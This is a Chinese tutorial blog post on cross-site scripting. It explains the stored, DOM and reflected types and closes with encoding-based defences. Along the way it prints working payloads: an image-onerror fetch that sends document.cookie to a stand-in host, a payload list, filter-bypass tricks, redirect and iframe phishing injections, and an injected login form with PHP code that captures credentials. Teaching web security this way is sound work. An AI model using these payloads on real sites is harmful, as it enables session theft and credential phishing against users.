---
title: "XSS 攻击和防御"
date: 
categories: web安全
tags: 
- XSS
---

### XSS 简介

xss 全称(Cross Site Scripting)跨站脚本攻击，为了不和层叠样式表(Cascading Style Sheet, CSS) 缩写混淆，因此写作 XSS。属于一种脚本注入攻击，也就是攻击者把恶意脚本、html注入网站，当前其他用户访问的时候，这些恶意脚本、html 就在注入的网站的上下文中运行，从而对访问者造成攻击。

<!-- more -->

### XSS 攻击危害

* 盗取用户 Cookie：有一天你发现仅剩 4 块钱（一个桶面）余额的银行卡，被转走了3.5 块到一位陌生用户，痛哭流涕的想着自己的晚餐（桶面）的情况下拨通了客服电话，接电话的还是个男的，顿时火冒三丈：谁转走了我的桶面，哦不，3.5 块? 客服查了下转账记录说：先生，您于某时某分某地登录银行网站转了 3.5 块给某某。此处省略1000字…….，很可能就是 Cookie 被盗走了，利用你在网站的权限把钱转走，还有 5 毛买个糖瓜吧。
* 导航到恶意网站：点击某个连接，进去的却是另外一个恶俗网站。
* 记录用户行为：攻击者可以通过使用 addEventListener 方法注册监听键盘事件的回调函数，并把所有用户行为发送到服务器，这些敲击行为可能记录者用户的敏感信息，比如密码和信用卡信息。
* 插入广告：是否有过这样的经历，当你通过某个连接进入某个网站的时候发现一顿不堪入目的广告（前提的是你没开广告拦截器）
* 钓鱼网站：这个词是否经常在某某新闻 APP 上看到？攻击者修改 DOM 插入假的登录框，或者把表单的action 属性指向他自己的服务器，然后欺骗用户提交用户的铭感信息。

### XSS 攻击方式

既然 XSS 可以造成这么大危害，当然应该建立一些防范措施。但是，不急，在聊防范方式之前，我们先来分析 XSS 是怎么实现上述攻击的？有哪些攻击方式？如何联合其他攻击方式一起使用？

XSS 共分为三种攻击方式，从易用上，存储型 XSS > DOM 型 XSS > 反射型 XSS。

#### 存储型 XSS

我们从简单的开始，存储型 XSS 就是存入了数据库，在取出来，导致 XSS。比较典型的地方是：消息论坛，评论区，留言板 XSS。攻击者构造好攻击代码，提交到评论区，当其他用户进入这个页面的时候，浏览器从服务器拉取数据，并做正常的 html 和 js 解析执行，进而触发 XSS 攻击。

```
户访问页面 > 浏览器获取 html | js（包括攻击代码）解析执行 > 完成攻击
```

那么攻击者是如何发现 XSS 漏洞，有是如何构造攻击代码提交到评论区的呢？这是一个比较大问题，这里分析个简单的demo，要看整个攻击的分析过程请转 [刘志龙大神-从零开始学 web 安全](http://imweb.io/topic/56b876a65c49f9d377ed8ef6)

原本的留言版如下：

![图片](https://ws2.sinaimg.cn/large/006tKfTcgy1fnqsur5ioqj30z608wac1.jpg)

为了简单点，上图的 input 没有做任何过滤与转码，我们直接提交下面的代码（这其实就是一种常见的 XSS payload。具体请看下文分析）：

```
hi, 你的 cookie 要被盗了哟<img src=1 onerror="fetch(`http://www.xsshack.com/?cookie=${document.cookie}`)" />
```

可以发现已经将攻击代码注入到留言区了：

![图片](https://ws1.sinaimg.cn/large/006tKfTcgy1fnqtxapmpwj31f00aydj4.jpg)

当其他用户访问当前页面的时候，cookie 就会被盗取（demo 的 url 随意写的，因此respose 会 502）：

![图片](https://ws1.sinaimg.cn/large/006tKfTcgy1fnqtz8y3yrj317c0zck0k.jpg)

#### DOM 型 XSS

简单理解就是它的输出点在 DOM，和后端完全没有关系，攻击者只要诱导别人去点击有 XSS 代码的 URL 就能实现攻击。看下面的 demo：

原始代码

![图片](https://ws2.sinaimg.cn/large/006tKfTcgy1fnqw9mtkh7j31g80oujyh.jpg)

带有 XSS 代码的 URL，只要将这个链接发出去，诱导其他人点击就能造成攻击，这里同样用了上面例子的 payload (还挺好用的 ^_^)

![图片](https://ws1.sinaimg.cn/large/006tKfTcgy1fnqwao6jdwj31g40s6ai9.jpg)

#### 反射型 XSS

反射型 XSS，也是通过给别人发送带有 XSS 代码的链接，诱导其他人点击进而造成攻击。与 DOM 型 XSS 不同的是，这类型攻击一般出现在搜索页面，需要将注入代码从目标服务器通过错误信息、搜索结果等方式“反射”回来，在受害者浏览器上执行，而 DOM 型 XSS 是不需要经过目标服务器的，明白这点就很容易区分 反射性 XSS 和 DOM 型 XSS 了。

看下面这个经典案例：

> 如下登录页面，我们为了用户能在登录之后访问到之前浏览的页面，所以在url加入了一个service参数，但是未对它做任何校验，可能会被钓鱼网站利用。

![图片](https://ws3.sinaimg.cn/large/006tKfTcgy1fnqwuksg5sj30fd04u0ss.jpg)

**该攻击实现条件：**

1. 用户点击了如下连接：
   https://cas.utest.qq.com/qqlogin?service=http%3A%2F%2Fpianzi.com；
2. 后端未对service参数做校验，这个连接可以正常跳转到上图的页面；
3. 用户输入帐号登录后，跳转到 [pianzi.com；]()
4. 这是个钓鱼网站，通过网站风格欺骗，对用户进行引导性操作；
5. 用户输入一些有用的信息；
6. 在不知不觉之间，用户泄漏了自己的信息。

### XSS payload

上面有谈到窃取 cookie 的 demo 中谈到了 XSS payload, XSS payload 是什么？

> XSS攻击成功后，攻击者能够对用户当前浏览的页面植入恶意脚本，通过恶意脚本，控制用户的浏览器。这些用已完成各种具体功能的恶意脚本，被称为”XSS payload"。

> XSS Payload实际上就是JavaScript脚本（还可以是Flash或其他富客户端的脚本），所以任何Javascript脚本能实现的功能，XSS Payload都能做到。

举几个列子，非常多：

```
<script>alert(1)</script>
<iframe src="javascript:alert(1)">
<iframe onload=alert(1)>
<img src=1 onerror=alert(1)>
<a href="javascript:alert(1)">111</a>
<marquee onscroll=alert(1)>
<object data="javascript:alert(1)">
<svg onload=alert(1)>
<body onload=alert(1)>
<select name="" onmouseover=alert(1)>
<script>window.setAttribute('onload',alert('xss')</script>
Javascript:eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))
<img src=1 onerror=with(body)createElement('script').src="外部JS地址">
```



### 入侵方法（摘自[XSS的利用方式----(朽木原创)](http://nvhack.com/forum.php?mod=viewthread&tid=162&extra=page%3D1)

攻击者发现xss漏洞->构造代码->发送给受害人->受害人打开->窃取受害人cookie->完成攻击.

**盗取cookie:**可以使用现成的xss平台.

如果cookie中的某些关键值加了HttpOnly,那么就可以避免该网页的cookie被客户端的JS存取，也就保护了用户的cookie不被盗取.

当前可见的绕过Httponly的方法大致可以分为两类：一类是服务器配置或功能实现上存在可能被利用的弱点，可归结为服务端的信息泄露。如利用404 页、PHPINFO页，Trace方法等绕过HTTPonly；另一类是客户端漏洞或功能上存在可以被利用的弱点，可归结为客户端的信息泄露。如 MS08-069、利用ajax或flash读取set-cookie等。

**绕过防御**

**过滤了alert(1)的括号,可以用alert`1`  //反引号**

**利用js字符串模块  eval.call`${'\141\154\145\162\164\50\61\51'}`**

**转换大小写<scRiPt>alert(1)<ScRipt>**

**绕过Php的htmlspecialchars()**

Php的htmlspecialchars()默认能将< > & “转成< > & "

如果用了htmlspecialchars($name, ENT_QUOTES);   则 ’ 也会被转成 '

如果用了 htmlspecialchars ($name, ENT_NOQUOTES);则单双引号都不会被转换。

**J****s中可用以下代码绕过**：

Javascript:eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))

**H****tml中可用以下代码绕过**:

‘ onmouseover=’alert(1)

源代码是<input type=”text” value=””>

变成了<input type=”text” value=” ‘ onmouseover=’alert(1)”>

**2.php源代码**

<?php

$name = $_GET["name"];

$name = htmlspecialchars($name);

?>

<input type='text' value='<?php echo $name?>'>

地址栏输入<http://127.0.0.1/2.php?name>=’ onmouseover=’alert(1)后回车

然后将鼠标移到那个框框后， 弹出弹窗.

**Xss钓鱼(挂马):**

(1)**xss重定向钓鱼**

如自己建一个钓鱼网站www.xiumu.com, 然后受害者访问如下地址http://www.test.com/a.php?id=””><script>document.location.href=”[http://www.xiumu.com](http://www.xiumu.com/)”</script>

或者http://www.test.com/a.php?id=””><iframe src=”[http://www.xiumu.com](http://www.xiumu.com/)” height=0 width=0 ></iframe>

(2)**HTML注入式钓鱼**

直接利用XSS漏洞注射HTML/js 代码到页面中.可写一个正常的HTML表单来窃取账号密码.如:<http://www.test.com/a.php?id=>””<html><head><title>login</title></head><body><div style=”text-align:center;”><form method=”POST” action=”xiumu.php” name=”form”><br/><p>username</p><input type=”text” value=”” name=”a”><p>password</p><input type=”password” name=”b” value=””><br/><input type=”submit” value=”login”></form></body></html>

这样当用户直接填入账号密码提交后，你就可以在xiumu.php接收到受害者的账号密码了.

Xiumu.php代码:<?php echo $_POST[‘a’]?><?php echo $_POST[‘b’]?>

(3)**Xss跨框架钓鱼**

这种方式是通过<iframe>嵌入远程域的一个页面实施钓鱼**,**http://www.test.com/a.php?id=””><iframe src=”[http://www.xiumu.com](http://www.xiumu.com/)” height=”100%” width=”100%”></iframe>将www.xiumu.com的页面做的和test的页面相同(可利用iframe实现)，但受害者看到的不是真正的test页面，而是xiumu页面.

（4）xss.tv 是个好网站

### 常用编码

刘志龙大神分析的很好，这里就不再赘述，[刘志龙-从零开始学web安全（3）](http://nvhack.com/forum.php?mod=viewthread&tid=162&extra=page%3D1)

### XSS 防御

XSS防御基本上遵循七条原则:

1. 不要在页面中插入任何不可信数据，除非这些数已经据根据下面几个原则进行了编码
2. 在将不可信数据插入到HTML标签之间时，对这些数据进行HTML Entity编码
3. 在将不可信数据插入到HTML属性里时，对这些数据进行HTML属性编码
4. 在将不可信数据插入到SCRIPT里时，对这些数据进行SCRIPT编码
5. 在将不可信数据插入到Style属性里时，对这些数据进行CSS编码
6. 在将不可信数据插入到HTML URL里时，对这些数据进行URL编码
7. 使用富文本时，使用XSS规则引擎进行编码过滤

[参考链接](http://www.freebuf.com/articles/web/9977.html)

